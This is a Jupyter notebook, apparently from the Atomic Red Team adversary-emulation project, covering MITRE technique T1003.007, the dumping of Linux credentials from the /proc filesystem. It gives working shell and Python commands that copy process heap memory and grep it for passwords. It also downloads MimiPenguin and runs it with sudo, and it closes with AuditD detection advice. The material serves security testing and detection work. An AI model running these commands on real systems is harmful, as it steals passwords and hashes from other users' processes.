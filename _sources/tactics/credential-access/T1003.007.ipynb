{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# T1003.007 - OS Credential Dumping: Proc Filesystem",
    "\n",
    "Adversaries may gather credentials from information stored in the Proc filesystem or <code>/proc</code>. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.\n\nThis functionality has been implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Atomic Tests"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Dump individual process memory with sh (Local)\nUsing `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n\n**Supported Platforms:** linux\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `None`!\n##### Description: Script to launch target process must exist\n\n##### Check Prereq Commands:\n```None\ntest -f /tmp/T1003.007.sh\ngrep \"T1003.007\" /tmp/T1003.007.sh\n\n```\n##### Get Prereq Commands:\n```None\necho '#!/bin/sh' > /tmp/T1003.007.sh\necho \"sh -c 'echo \\\"The password is T1003.007\\\" && sleep 30' &\" >> /tmp/T1003.007.sh\n\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.007 -TestNumbers 1 -GetPreReqs"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n```sh\nsh /tmp/T1003.007.sh\nPID=$(pgrep -n -f \"T1003.007\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"/tmp/T1003.007.bin\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.007 -TestNumbers 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Dump individual process memory with Python (Local)\nUsing `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\n\n**Supported Platforms:** linux\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `None`!\n##### Description: Script to launch target process must exist\n\n##### Check Prereq Commands:\n```None\ntest -f /tmp/T1003.007.sh\ngrep \"T1003.007\" /tmp/T1003.007.sh\n\n```\n##### Get Prereq Commands:\n```None\necho '#!/bin/sh' > /tmp/T1003.007.sh\necho \"sh -c 'echo \\\"The password is T1003.007\\\" && sleep 30' &\" >> /tmp/T1003.007.sh\n\n```\n##### Description: Requires Python\n\n##### Check Prereq Commands:\n```None\n(which python || which python3 || which python2)\n\n```\n##### Get Prereq Commands:\n```None\necho \"Python 2.7+ or 3.4+ must be installed\"\n\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.007 -TestNumbers 2 -GetPreReqs"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n```sh\nsh /tmp/T1003.007.sh\nPID=$(pgrep -n -f \"T1003.007\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON PathToAtomicsFolder/T1003.007/src/dump_heap.py $PID /tmp/T1003.007.bin\ngrep -i \"PASS\" \"/tmp/T1003.007.bin\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.007 -TestNumbers 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Capture Passwords with MimiPenguin\nMimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n\n**Supported Platforms:** linux\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n\n##### Check Prereq Commands:\n```sh\nif [ -f \"/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nwget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz\nmkdir /tmp/mimipenguin\ntar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin\n\n```\n##### Description: Strings must be installed\n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nsudo apt-get -y install binutils\n\n```\n##### Description: Python2 must be installed\n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nsudo apt-get -y install python2       \n\n```\n##### Description: Libc-bin must be installed\n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nsudo apt-get -y install libc-bin        \n\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.007 -TestNumbers 3 -GetPreReqs"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n```bash\nsudo /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt\ncat /tmp/T1003.007Test3.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.007 -TestNumbers 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Detection",
    "\n",
    "To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/\\*/maps</code>, where the <code>\\*</code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}